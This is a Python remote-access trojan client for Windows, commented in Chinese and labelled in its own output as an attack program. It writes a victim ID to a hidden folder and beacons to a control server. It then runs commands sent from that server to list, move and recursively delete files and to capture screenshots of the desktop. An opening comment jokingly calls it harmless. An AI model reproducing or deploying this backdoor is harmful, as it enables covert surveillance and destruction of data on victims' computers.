#!/usr/bin/python
# -*- coding: UTF-8 -*-
#这是一个人畜无害，相当温和，德芙般丝滑的小程序
import os
import socket
import time
import tkinter
import win32gui
import win32ui
import win32con
import win32api
import uuid
import shutil
import json


def remove_dir(dir):
	#用于删除路径的函数
	dir = dir.replace('\\', '/')
	if(os.path.isdir(dir)):
		for p in os.listdir(dir):
			remove_dir(os.path.join(dir,p))
		if(os.path.exists(dir)):
			os.rmdir(dir)
	else:
		if(os.path.exists(dir)):
			os.remove(dir)


class WinControl():
	def __init__(self,patha="",pathb="",data=""):
		self.path = ["C:"]
		self.host = ""
		self.patha = patha
		self.pathb = pathb
		self.data = data


	def uuid_write(self):
		#用于写入Windows的uuid唯一鉴别码
		l = []
		l.append(str(uuid.uuid4()))

		with open(self.patha,'w') as ojbk:
			json.dump(l,ojbk)

		return l[0]


	def uuid_read(self):
		#用于读取uuid码的函数
		with open(self.patha) as zx:  
			number = json.load(zx) 

		return number[0]


	def where_i_am(self):
		#用来反馈现在路径位置的函数
		path = "\\".join(self.path)
		return path


	def cd(self):
		#用来跳跃文件的位置
		if self.patha[0] == ".":
			path = self.patha
			path = path.lstrip(".")
			path = path.split("\\")
			pathlist = self.path + path
			self.path = pathlist

		else:
			self.path = self.patha.split("\\")
		
		return "None"


	def rm(self):
		#用于文件删除的函数
		if self.patha[0] == ".":
			path = self.patha
			path = path.lstrip(".")
			path = path.split("\\")
			path = self.path + path
			path = "\\".join(path)
		
		else:
			path = self.patha


		remove_dir(path)

		return "None"


	def mv(self):
		#用于移动文件的函数
		patha = self.patha
		pathb = self.pathb
		shutil.move(patha,pathb)
		return "None"


	def ls(self):
		#用于列出此目录下文件的函数
		if self.patha == "./":
			path = "\\".join(self.path)
		else:
			path = self.patha

		all_list = []
		for root , dirs, files in os.walk(path,topdown=True):
			a = dirs + files
			a = 'thisisafengefu'.join(a)
			return a


	def get_photo(self):

		# 获取桌面
		hdesktop = win32gui.GetDesktopWindow()

		# 分辨率适应
		width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
		height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
		left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
		top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)

		# 创建设备描述表
		desktop_dc = win32gui.GetWindowDC(hdesktop)
		img_dc = win32ui.CreateDCFromHandle(desktop_dc)

		# 创建一个内存设备描述表
		mem_dc = img_dc.CreateCompatibleDC()

		# 创建位图对象
		screenshot = win32ui.CreateBitmap()
		screenshot.CreateCompatibleBitmap(img_dc, width, height)
		mem_dc.SelectObject(screenshot)

		# 截图至内存设备描述表
		mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)


		filename = str(uuid.uuid4())
		filepath = self.patha + filename + ".bmp"
		# 将截图保存到文件中
		screenshot.SaveBitmapFile(mem_dc, filepath)


		mem_dc.DeleteDC()
		win32gui.DeleteObject(screenshot.GetHandle())

		return "None"


class Socketz():

	def __init__(self,host,port,data=""):
		self.data = data
		self.host = host
		self.port = port
		self.sock = socket.socket()

	def connect(self):
		self.sock.connect((self.host, self.port))


	def heart(self):
		#发送被害心跳的函数
		self.sock.send("heart".encode("utf-8"))
		my = self.sock.recv(1024).decode("utf-8")
		#发送uuid
		self.sock.send(self.data.encode("utf-8"))
		server_rec = self.sock.recv(1024).decode("utf-8")

		return server_rec


	def long_tcp(self):
		while True:
			self.sock.send("intotcplong".encode("utf-8"))
			cmd = self.sock.recv(1024).decode("utf-8")
			cmd = cmd.split("@")
			data = cmdx(cmd)
			if data == None:
				data = "None"
			self.sock.send(data.encode("utf-8"))


	def stop(self):
		self.sock.close()


def cmdx(cmd):

	if cmd[0] == "ls":
		if len(cmd) > 1:
			windows.patha = cmd[1]
		else:
			windows.patha = "./"
		p = windows.ls()
		return p


	if cmd[0] == "we":
		p = windows.where_i_am()
		return p


	if cmd[0] == "rm":
		windows.patha = cmd[1]
		p = windows.rm()
		return p


	if cmd[0] == "cd":
		windows.patha = cmd[1]
		p = windows.cd()
		return p


	if cmd[0] == "mv":
		windows.patha = cmd[1]
		windows.pathb = cmd[2]
		p = windows.mv()
		return p


	if cmd[0] == "gp":
		windows.patha = cmd[1]
		p = windows.get_photo()
		return p



def main():
	print("攻击程序 客户端启动\n 核心主控程序")


	if os.path.exists(r"C:\sun32\center\windows"):
		windows.patha = r"C:\sun32\center\windows\uuid.json"
		uuid = windows.uuid_read()
		print(uuid)

	else:
		
		os.makedirs(r"C:\sun32\center\windows")
		windows.patha = r"C:\sun32\center\windows\uuid.json"
		uuid = windows.uuid_write()
		print(uuid)


	while True:
		print("进入循环")

		sockc = Socketz(host="127.0.0.1"\
			,port=2233)
		sockc.data = uuid
		sockc.connect()

		cmd = sockc.heart()
		if cmd == "stop":
			sockc.stop()
			print("开始等待")
			time.sleep(5)
		if cmd == "start":
			sockc.long_tcp()
		



'''

	if cmd[0] == "upload":


	
	if cmd[0] == "":
'''

if __name__=='__main__':
	windows = WinControl()
	main()



























